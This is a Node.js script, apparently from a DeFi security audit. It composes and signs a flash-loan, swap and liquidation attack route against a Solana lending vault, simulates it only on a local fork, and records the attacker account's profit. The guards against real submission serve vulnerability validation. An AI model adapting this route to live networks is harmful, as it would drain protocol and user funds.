#!/usr/bin/env node
// Local-fork-only, attacker-owned, sigVerify:true v1 route validation for vault 105.
// This script never invokes sendTransaction and refuses non-loopback RPC URLs.
import fs from 'node:fs';
import crypto from 'node:crypto';
import {createRequire} from 'node:module';
const require = createRequire(import.meta.url);
const root = '/Users/stacc/the-composer-rescue/composer-runs/2026-10-15';
const modules = `${root}/jup6qf-sdk/node_modules/`;
const web3 = require(`${modules}@solana/web3.js/lib/index.cjs.js`);
const spl = require(`${modules}@solana/spl-token/lib/cjs/index.js`);
const bsModule = require(`${modules}bs58`);
const bs58 = bsModule.default || bsModule;
const BN = require(`${modules}bn.js/lib/bn.js`);
const {getLiquidatePerfectDexIx} = await import(`${root}/jup6qf-sdk/dist/borrow/index.mjs`);
const {encodeV1} = require(`${root}/klend-v1-composition.js`);
const {PublicKey, Keypair, TransactionInstruction, TransactionMessage, SystemProgram, Connection} = web3;
const P = (x) => new PublicKey(x);

const FORK = process.env.FORK_RPC || 'http://127.0.0.1:9057';
if (!/^http:\/\/(127\.0\.0\.1|localhost)(:\d+)?$/.test(FORK)) throw new Error('Refusing non-loopback fork RPC');
const PROGRAM = {
  dex: P('jupZ4m2GqUCJ5iueMfzQf8khFfH31d4XAQt3RzCT9Vd'),
  vaults: P('jupr81YtYssSyPt8jbnGuiWon5f6x9TcDEFxYe3Bdzi'),
  klend: P('KLend2g3cP87fffoy8q1mQqGKjrxjC8boSyAYavgmjD'),
  token: spl.TOKEN_PROGRAM_ID,
  token2022: spl.TOKEN_2022_PROGRAM_ID,
};
const USDGO = P('72puLt71H93Z9CzHuBRTwFpL4TG3WZUhnoCC7p8gxigu');
const USDC = P('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');
const DEX = P('B5UUGqshnzEp5XzkbnMn64rpJy5WMFJFU2JP8zd1yBX8');
const POSITION = P('9FrRPr4Amb3c1riSBCrBryS5Uagq9qvNpUaMHUZJujhg');
const DISC_SWAP_IN = Buffer.from([141,172,10,208,69,9,56,154]);
const DISC_SWAP_OUT = Buffer.from([206,36,149,14,163,132,148,1]);
const fixtureFile = JSON.parse(fs.readFileSync(`${root}/jupiter-dex-recent-swap-fixtures.json`));
const swapFixture = fixtureFile.rows.find((row) => row.vaultId === 105)?.fixture;
if (!swapFixture || swapFixture.accounts.length !== 24) throw new Error('vault 105 swap fixture unavailable');
const dexIdl = JSON.parse(fs.readFileSync('/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/jupiter-lend-current/public/idl/dex.json'));
const swapSpec = Object.fromEntries(dexIdl.instructions.map((ix) => [ix.name, ix]));

let rpcId = 0;
async function rpc(method, params) {
  const response = await fetch(FORK, {method:'POST', headers:{'content-type':'application/json'},
    body:JSON.stringify({jsonrpc:'2.0', id:++rpcId, method, params}), signal:AbortSignal.timeout(30_000)});
  const json = await response.json();
  if (json.error) throw new Error(`${method}: ${JSON.stringify(json.error)}`);
  return json.result;
}
const u64 = (n) => { const b=Buffer.alloc(8); b.writeBigUInt64LE(BigInt(n)); return b; };
const cloneIx = (ix) => new TransactionInstruction({programId:ix.programId,
  keys:ix.keys.map((k)=>({...k})), data:Buffer.from(ix.data)});

function historyIx(tx, i) {
  const msg=tx.transaction.message;
  const all=[...msg.accountKeys,...(tx.meta.loadedAddresses?.writable||[]),...(tx.meta.loadedAddresses?.readonly||[])];
  const h=msg.header, staticCount=msg.accountKeys.length;
  const writable=(j)=>j<staticCount ? (j<h.numRequiredSignatures ?
    j<h.numRequiredSignatures-h.numReadonlySignedAccounts : j<staticCount-h.numReadonlyUnsignedAccounts) :
    j<staticCount+(tx.meta.loadedAddresses?.writable||[]).length;
  const ix=msg.instructions[i];
  return new TransactionInstruction({programId:P(all[ix.programIdIndex]), keys:ix.accounts.map((j)=>({
    pubkey:P(all[j]), isSigner:j<h.numRequiredSignatures, isWritable:writable(j)})), data:Buffer.from(bs58.decode(ix.data))});
}

async function setOwnedTokenAccount(target, template, owner, amount=0n) {
  const result=await rpc('getAccountInfo',[template.toBase58(),{encoding:'base64',commitment:'processed'}]);
  if (!result.value) throw new Error(`token template missing: ${template}`);
  const data=Buffer.from(result.value.data[0],'base64');
  owner.toBuffer().copy(data,32);
  data.writeBigUInt64LE(amount,64);
  await rpc('surfnet_setAccount',[target.toBase58(),{data:data.toString('hex'),executable:false,
    lamports:result.value.lamports,owner:result.value.owner,rentEpoch:0}]);
}

function makeSwapKeys(attacker, attackerUsdgo, attackerUsdc) {
  const addresses=swapFixture.accounts.map(P);
  for (const i of [0,4]) addresses[i]=attacker;
  for (const i of [2,5]) addresses[i]=attackerUsdgo;
  for (const i of [3,6]) addresses[i]=attackerUsdc;
  return addresses.map((pubkey,i)=>({pubkey,isSigner:!!swapSpec.swap_in.accounts[i].signer,
    isWritable:!!swapSpec.swap_in.accounts[i].writable}));
}
function swapOut(keys, exactUsdgoOut, maxUsdcIn) {
  return new TransactionInstruction({programId:PROGRAM.dex,keys:keys.map((k)=>({...k})),
    data:Buffer.concat([DISC_SWAP_OUT,Buffer.from([0]),u64(exactUsdgoOut),u64(maxUsdcIn)])});
}
function swapIn(keys, usdgoIn) {
  return new TransactionInstruction({programId:PROGRAM.dex,keys:keys.map((k)=>({...k})),
    data:Buffer.concat([DISC_SWAP_IN,Buffer.from([1]),u64(usdgoIn),u64(0n)])});
}
function flashIx(template, attacker, attackerUsdc, amount, repayIndex) {
  const ix=cloneIx(template); ix.keys[0].pubkey=attacker; ix.keys[6].pubkey=attackerUsdc;
  ix.data.writeBigUInt64LE(amount,8); if (repayIndex!==undefined) ix.data[16]=repayIndex; return ix;
}
function tokenImage(row) {
  if (!row?.data) return null; const data=Buffer.from(row.data[0],'base64');
  return {owner:row.owner,lamports:row.lamports,dataSha256:crypto.createHash('sha256').update(data).digest('hex'),
    amountRaw:(row.owner===PROGRAM.token.toBase58()||row.owner===PROGRAM.token2022.toBase58())&&data.length>=72 ?
      data.readBigUInt64LE(64).toString():null};
}
function signV1(instructions, attacker, blockhash) {
  const encoded=encodeV1(instructions,attacker.publicKey,blockhash);
  const compiled=new TransactionMessage({payerKey:attacker.publicKey,recentBlockhash:blockhash,instructions}).compileToV0Message();
  const signed=Buffer.from(encoded.wire), count=encoded.requiredSignatures;
  const signerOrder=compiled.staticAccountKeys.slice(0,count).map(String);
  if (count!==1||signerOrder[0]!==attacker.publicKey.toBase58()) throw new Error(`uncontrolled signer(s): ${signerOrder}`);
  const msg=signed.subarray(0,signed.length-64*count);
  const priv=crypto.createPrivateKey({key:Buffer.concat([Buffer.from('302e020100300506032b657004220420','hex'),
    Buffer.from(attacker.secretKey.subarray(0,32))]),format:'der',type:'pkcs8'});
  crypto.sign(null,msg,priv).copy(signed,signed.length-64*count);
  return {encoded,signed,signerOrder};
}

async function main() {
  const attacker=Keypair.generate();
  const attackerUsdgo=spl.getAssociatedTokenAddressSync(USDGO,attacker.publicKey,false,PROGRAM.token2022);
  const attackerUsdc=spl.getAssociatedTokenAddressSync(USDC,attacker.publicKey,false,PROGRAM.token);
  await rpc('surfnet_setAccount',[attacker.publicKey.toBase58(),{data:'',executable:false,
    lamports:10_000_000_000,owner:SystemProgram.programId.toBase58(),rentEpoch:0}]);
  // Historical user accounts may already be closed; the live pool vaults provide
  // canonical account layouts for both token programs. Only owner/amount change.
  await setOwnedTokenAccount(attackerUsdgo,P(swapFixture.accounts[13]),attacker.publicKey);
  await setOwnedTokenAccount(attackerUsdc,P(swapFixture.accounts[14]),attacker.publicKey,1_000_000_000_000n);

  const history=JSON.parse(fs.readFileSync(`${root}/kamino-flash-history.json`)).hits[0];
  const flashBorrowTemplate=historyIx(history.transaction,3), flashRepayTemplate=historyIx(history.transaction,13);
  if (!flashBorrowTemplate.programId.equals(PROGRAM.klend)||!flashRepayTemplate.programId.equals(PROGRAM.klend))
    throw new Error('KLend flash fixture indexes changed');
  if (!flashBorrowTemplate.keys[4].pubkey.equals(USDC)) throw new Error('KLend fixture is not USDC');
  const reserveAccount=await rpc('getAccountInfo',[flashBorrowTemplate.keys[3].pubkey.toBase58(),{encoding:'base64',commitment:'processed'}]);
  const reserveData=Buffer.from(reserveAccount.value.data[0],'base64');
  const availableRaw=reserveData.readBigUInt64LE(224);
  const flashAmount=availableRaw-1n;
  // This exact size succeeded against the current DEX binary in the earlier
  // signed v105 matrix. Do not infer pool liquidity from a guessed account offset.
  const requestedUsdgoOut=3_900_000_000_000n;
  const keys=makeSwapKeys(attacker.publicKey,attackerUsdgo,attackerUsdc);
  const connection=new Connection(FORK,'processed');
  const liquidation=await getLiquidatePerfectDexIx({vaultId:105,connection,signer:attacker.publicKey,
    debtAmt:new BN('18446744073709551615'),colPerUnitDebt:new BN(0),
    colAmounts:{token0PerUnitShares:new BN(0),token1PerUnitShares:new BN(0)},includeATASetup:false});
  if (liquidation.ixs.length!==1) throw new Error(`unexpected liquidation setup: ${liquidation.ixs.length} instructions`);
  const liquidateIx=cloneIx(liquidation.ixs[0]);
  // Smart collateral has no Liquidity supply position. The packaged SDK
  // derives a nonexistent account here; Anchor's optional-account sentinel
  // is this program ID. Keep the real Liquidity borrow position at index 13.
  if (!liquidateIx.keys[12]?.pubkey.equals(liquidation.accounts.vaultSupplyPositionOnLiquidity))
    throw new Error('liquidation account layout changed');
  liquidateIx.keys[12].pubkey=PROGRAM.vaults;
  const watched=[attacker.publicKey,attackerUsdgo,attackerUsdc,POSITION,DEX,
    ...swapFixture.accounts.slice(9,17).map(P),flashBorrowTemplate.keys[3].pubkey,
    flashBorrowTemplate.keys[5].pubkey,flashBorrowTemplate.keys[7].pubkey];
  const uniqueWatched=[...new Map(watched.map((p)=>[p.toBase58(),p])).values()];
  for (const address of uniqueWatched) await rpc('getAccountInfo',[address.toBase58(),{encoding:'base64',commitment:'processed'}]);
  const baseline=await rpc('getMultipleAccounts',[uniqueWatched.map(String),{encoding:'base64',commitment:'processed'}]);
  const cases=[
    {label:'direct_permissionless_liquidation_control',ixs:[liquidateIx]},
    {label:'max_klend_flash_pool_a_round_trip_control',make:()=>{
      const ixs=[flashIx(flashBorrowTemplate,attacker.publicKey,attackerUsdc,flashAmount),
        swapOut(keys,requestedUsdgoOut,flashAmount+1_000_000_000_000n),swapIn(keys,requestedUsdgoOut),
        flashIx(flashRepayTemplate,attacker.publicKey,attackerUsdc,flashAmount,0)]; return ixs;}},
    {label:'max_klend_flash_pool_a_liquidate_pool_a_unwind',make:()=>{
      const ixs=[flashIx(flashBorrowTemplate,attacker.publicKey,attackerUsdc,flashAmount),
        swapOut(keys,requestedUsdgoOut,flashAmount+1_000_000_000_000n),liquidateIx,swapIn(keys,requestedUsdgoOut),
        flashIx(flashRepayTemplate,attacker.publicKey,attackerUsdc,flashAmount,0)]; return ixs;}},
  ];
  const results=[];
  for (const test of cases) {
    const ixs=test.ixs||test.make();
    const blockhash=(await rpc('getLatestBlockhash',[{commitment:'processed'}])).value.blockhash;
    let signed;
    try { signed=signV1(ixs,attacker,blockhash); }
    catch (error) { results.push({label:test.label,localCompositionError:String(error.stack||error)}); continue; }
    const sim=await rpc('simulateTransaction',[signed.signed.toString('base64'),{encoding:'base64',sigVerify:true,
      replaceRecentBlockhash:false,commitment:'processed',innerInstructions:true,
      accounts:{encoding:'base64',addresses:uniqueWatched.map(String)}}]);
    const before=baseline.value.map(tokenImage);
    const after=uniqueWatched.map((_,i)=>tokenImage(sim.value.accounts?.[i]));
    const deltas=Object.fromEntries(uniqueWatched.map((address,i)=>[address.toBase58(),{
      tokenRaw:before[i]?.amountRaw!=null&&after[i]?.amountRaw!=null ?
        (BigInt(after[i].amountRaw)-BigInt(before[i].amountRaw)).toString():null,
      lamports:before[i]&&after[i]?after[i].lamports-before[i].lamports:null,
      beforeSha256:before[i]?.dataSha256,afterSha256:after[i]?.dataSha256,
    }]));
    results.push({label:test.label,err:sim.value.err,unitsConsumed:sim.value.unitsConsumed,
      wire:{version:1,bytes:signed.encoded.sizeBytes,addresses:signed.encoded.addressCount,
        writable:signed.encoded.writableCount,instructions:signed.encoded.instructionCount,
        requiredSignatures:signed.encoded.requiredSignatures,signerOrder:signed.signerOrder,
        sha256:crypto.createHash('sha256').update(signed.signed).digest('hex')},
      attackerEquityDeltaRaw:sim.value.err?null:{usdgo:deltas[attackerUsdgo].tokenRaw,
        usdc:deltas[attackerUsdc].tokenRaw,totalAtPeg:(BigInt(deltas[attackerUsdgo].tokenRaw||0)+BigInt(deltas[attackerUsdc].tokenRaw||0)).toString(),
        nativeLamports:deltas[attacker.publicKey].lamports},
      protocolDeltas:deltas,logs:sim.value.logs,innerInstructions:sim.value.innerInstructions});
    console.log(JSON.stringify({label:test.label,err:sim.value.err,bytes:signed.encoded.sizeBytes,
      addresses:signed.encoded.addressCount,instructions:signed.encoded.instructionCount,
      units:sim.value.unitsConsumed,lastLogs:sim.value.logs?.slice(-8)}));
  }
  const report={generatedAt:new Date().toISOString(),scope:'local fork only; no mainnet submission',
    forkRpc:FORK,forkBaselineSlot:baseline.context.slot,signatureVerification:true,attacker:attacker.publicKey.toBase58(),
    attackerUsdgo:attackerUsdgo.toBase58(),attackerUsdc:attackerUsdc.toBase58(),
    fixture:{swapSignature:swapFixture.signature,swapSlot:swapFixture.slot,klendSignature:history.signature,klendSlot:history.slot},
    market:{vaultId:105,targetPosition:POSITION.toBase58(),dex:DEX.toBase58(),
      requestedUsdgoOutRaw:requestedUsdgoOut.toString()},
    flash:{reserve:flashBorrowTemplate.keys[3].pubkey.toBase58(),availableRaw:availableRaw.toString(),
      borrowedRaw:flashAmount.toString(),supplyVault:flashBorrowTemplate.keys[5].pubkey.toBase58(),feeVault:flashBorrowTemplate.keys[7].pubkey.toBase58()},
    liquidation:{instructionDataHex:liquidateIx.data.toString('hex'),accountMetas:liquidateIx.keys.length,
      remainingAccountsIndices:[...liquidation.remainingAccountsIndices]},
    watch:uniqueWatched.map(String),baseline:baseline.value.map(tokenImage),results,
    accounting:'Attacker totalAtPeg is USDGO raw + USDC raw (both six decimals). Every watched attacker, DEX/Liquidity, target-position, KLend reserve/supply/fee account records token, lamport, and data-hash deltas. Failed simulations are atomic rollbacks and therefore have no post-equity claim.'};
  fs.writeFileSync(new URL('./signed-v105-route-matrix.json',import.meta.url),JSON.stringify(report,null,2)+'\n');
}
main().catch((error)=>{console.error(error.stack||error);process.exitCode=1;});
